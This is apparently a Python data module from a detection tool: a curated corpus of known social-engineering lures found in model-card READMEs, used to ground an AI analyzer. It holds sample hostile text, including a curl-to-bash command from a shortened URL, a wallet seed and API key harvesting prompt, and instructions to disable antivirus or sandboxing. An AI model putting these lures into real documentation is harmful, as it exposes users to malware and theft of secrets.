"""Curated corpus of known model-card / README social-engineering patterns.

Seeds the local vector store (see ``..retrieval``). Retrieval grounds the AI
analyzer in concrete known-bad examples instead of asking Claude to judge a
README from a blank slate.
"""

THREAT_PATTERNS = [
    {
        "id": "disable_antivirus",
        "pattern_name": "fake_antivirus_warning",
        "text": "Your antivirus may flag this download as a false positive. "
                "Please disable Windows Defender / your antivirus before "
                "running the installer.",
        "description": "Instructs the user to disable security software before running an executable.",
    },
    {
        "id": "curl_pipe_shell",
        "pattern_name": "curl_pipe_to_shell",
        "text": "Just run: curl -sSL https://bit.ly/setup-model | bash to install "
                "everything automatically, no need to read the script first.",
        "description": "Pipes a script from an unofficial/shortened URL straight into a shell.",
    },
    {
        "id": "fake_urgency",
        "pattern_name": "fake_urgency_countdown",
        "text": "This model will be taken down in 24 hours due to licensing "
                "issues, download it now before it's gone forever!",
        "description": "Manufactures urgency to pressure a quick, unexamined download.",
    },
    {
        "id": "typosquat_authority",
        "pattern_name": "false_official_claim",
        "text": "This is the official OpenAI release of GPT-5, verified and "
                "endorsed by the OpenAI team, published here first.",
        "description": "Claims official endorsement from a major org that does not match the actual publisher.",
    },
    {
        "id": "wallet_seed_request",
        "pattern_name": "credential_or_wallet_request",
        "text": "To activate the model, enter your wallet seed phrase or API "
                "keys into config.json and submit the verification form.",
        "description": "Asks the user to submit secrets (wallet seed, API keys, passwords) to 'activate' the model.",
    },
    {
        "id": "disable_sandbox",
        "pattern_name": "disable_sandbox_detection",
        "text": "If running in a VM or sandbox, set SANDBOX_BYPASS=1 and run "
                "as administrator/root so the model can access the full filesystem.",
        "description": "Instructs disabling sandboxing/VM protections and running with elevated privileges.",
    },
    {
        "id": "fake_support_contact",
        "pattern_name": "fake_support_redirect",
        "text": "Having issues? Contact our support team on Telegram at "
                "@modelsupport_help for a manual fix and remote screen access.",
        "description": "Redirects users to an off-platform contact offering remote access under the guise of support.",
    },
    {
        "id": "shortlink_download",
        "pattern_name": "obscured_download_link",
        "text": "Download weights here: tinyurl.com/xyz123 (mirror in case "
                "huggingface is slow).",
        "description": "Hides the real download destination behind a URL shortener instead of linking the source directly.",
    },
    {
        "id": "unverifiable_endorsement",
        "pattern_name": "unverifiable_celebrity_endorsement",
        "text": "As used and recommended by leading AI researchers at top labs "
                "(names withheld for privacy) — trusted by thousands.",
        "description": "Cites vague, unverifiable endorsements to manufacture social proof.",
    },
    {
        "id": "mismatched_claims",
        "pattern_name": "capability_repo_mismatch",
        "text": "This 50MB repo contains a full GPT-4-class model that runs "
                "offline on any laptop with zero GPU required.",
        "description": "Makes capability claims that are implausible given what the repo actually contains.",
    },
    {
        "id": "legit_install_instructions",
        "pattern_name": "legitimate_install_instructions",
        "text": "Install with `pip install -r requirements.txt` then run "
                "`python train.py --config config.yaml`. See LICENSE for terms.",
        "description": "Ordinary, legitimate installation instructions — not a threat pattern.",
    },
]
